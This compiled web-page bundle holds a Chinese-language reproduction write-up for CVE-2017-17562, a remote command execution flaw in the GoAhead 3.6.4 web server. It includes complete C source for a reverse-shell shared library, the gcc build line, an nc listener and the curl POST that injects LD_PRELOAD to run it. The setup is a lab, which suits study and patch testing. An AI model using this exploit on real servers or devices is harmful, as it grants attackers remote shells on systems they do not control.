import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o,c as i,a as n,b as s,d as t,e as a}from"./app-58e4a7d6.js";const l={},d=a('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，<code>LD_</code>开头的环境变量和动态链接库有关，如<code>LD_PRELOAD</code>中指定的动态链接库，将会被自动加载；<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库。</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p><p>参考链接：</p>',5),r={href:"https://www.elttam.com.au/blog/goahead/",target:"_blank",rel:"noopener noreferrer"},u=a(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后，访问<code>http://your-ip:8080/</code>即可看到欢迎页面。但是访问<code>http://your-ip:8080/cgi-bin/index</code>不能查看到Hello页面，<strong>重新搭建复现环境</strong>。</p>`,5),k={href:"https://xz.aliyun.com/t/6407",target:"_blank",rel:"noopener noreferrer"},v=a(`<p>下载、编译并运行存在该漏洞的GoAhead（3.6.4）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>git clone https://github.com/embedthis/goahead.git
cd goahead
git checkout tags/v3.6.4 
make #编译GoAhead
cd test # 要进到test目录下运行，其它目录下没有self.key等文件会报错
gcc ./cgitest.c -o cgi-bin/cgitest #编译用来测试的CGI文件
sudo ../build/linux-x64-default/bin/goahead #运行GoAhead Web服务器
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功启动GoAhead Web服务器：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232301657.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>测试cgi页面能否访问。成功访问，显示版本为3.6.4，存在CVE-2017-17562漏洞，开始漏洞复现。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ curl http://172.16.217.185:80/cgi-bin/cgitest
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232257119.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>编译用于动态加载的so，首先新建<code>exp.c</code>。</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/socket.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;netinet/in.h&gt;</span></span>

<span class="token keyword">char</span> <span class="token operator">*</span>server_ip<span class="token operator">=</span><span class="token string">&quot;192.168.174.128&quot;</span><span class="token punctuation">;</span>
<span class="token class-name">uint32_t</span> server_port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">//socket initialize</span>
    <span class="token keyword">int</span> sock <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> attacker_addr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    attacker_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    attacker_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>server_port<span class="token punctuation">)</span><span class="token punctuation">;</span>
    attacker_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>server_ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//connect to the server</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>attacker_addr<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>attacker_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//dup the socket to stdin, stdout and stderr</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">dup2</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//execute /bin/sh to get a shell</span>
    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>gcc将<code>exp.c</code>编译为<code>exp.so</code>。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>gcc -shared -fPIC ./exp.c -o exp.so
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在控制端监听9999端口：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -vvl 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行POC：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X POST --data-binary @exp.so http://192.168.174.128/cgi-bin/cgitest\\?LD_PRELOAD\\=/proc/self/fd/0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功获取shell并执行命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232300924.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18);function m(b,h){const e=c("ExternalLinkIcon");return o(),i("div",null,[d,n("ul",null,[n("li",null,[n("a",r,[s("https://www.elttam.com.au/blog/goahead/"),t(e)])])]),u,n("ul",null,[n("li",null,[s("参考阅读："),n("a",k,[s("https://xz.aliyun.com/t/6407"),t(e)])])]),v])}const x=p(l,[["render",m],["__file","GoAhead Server 远程命令执行漏洞 CVE-2017-17562.html.vue"]]);export{x as default};
